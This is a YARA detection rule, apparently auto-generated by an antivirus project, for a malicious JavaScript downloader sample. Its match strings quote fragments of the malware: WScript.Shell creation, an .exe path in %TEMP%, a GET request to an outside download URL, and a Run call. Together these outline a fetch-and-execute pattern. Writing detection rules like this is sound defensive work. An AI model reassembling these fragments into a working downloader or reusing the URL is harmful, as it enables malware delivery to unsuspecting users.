rule sig_20160329_eb26dc9cc8626e2ecfa32be669cabc68 {
  meta:
    description = "datamaliciousorder - file 20160329_eb26dc9cc8626e2ecfa32be669cabc68.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e53140a79a183078546fb342968da0db5a15315b833372495b3557c405a1441d"

  strings:
    $s1  = "function Cvymnxj() {return Fqlafos[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"I3rrBUy8t.exe\";};" fullword ascii
    $s2  = "Ikzozrbsw[Yujjecckbp](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Hgyaxer](Ahoxqhwrqm() * 11)} while (Ikzozrbsw[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Yrjlbbhsq(Mdktwnqd, Jwxgs){return Mdktwnqd - Jwxgs;};" fullword ascii
    $s5  = "var Fqlafos = function Msdcdtjrrm() {return WScript[Lomqr](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vcbylm(Vglesravin){Fqlafos[\"Run\"](Vglesravin, Axwzzg, Axwzzg);};" fullword ascii
    $s7  = "function Efanvqyo() {return ((Pzbkigbcq == true) && (Pzbkigbcq == Nxeobrk)) ? 1 : Axwzzg;};" fullword ascii
    $s8  = "function Fjufdmogge(){return Lomqr;};" fullword ascii
    $s9  = "var Nxeobrk = false;" fullword ascii
    $s10 = "Nxeobrk = true; " fullword ascii
    $s11 = "Pzbkigbcq = true; " fullword ascii
    $s12 = "function Azqcgeyq(Dnkdjzuhv) {var Urrvngyc = (1, 2, 3, 4, 5, Dnkdjzuhv); return Urrvngyc;};" fullword ascii
    $s13 = "function Ynoxliobt()" fullword ascii
    $s14 = "return Yrjlbbhsq(Efctmtsrqm, Zqgdgdgr);" fullword ascii
    $s15 = "var Bgndq = false;" fullword ascii
    $s16 = "var Lmraiv = new this[\"Date\"]();" fullword ascii
    $s17 = "var Pzbkigbcq = false;" fullword ascii
    $s18 = " while (Diebxo){" fullword ascii
    $s19 = "function Ahoxqhwrqm(){return 22;};" fullword ascii
    $s20 = "function Hvrjvb(){return Vpwle;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}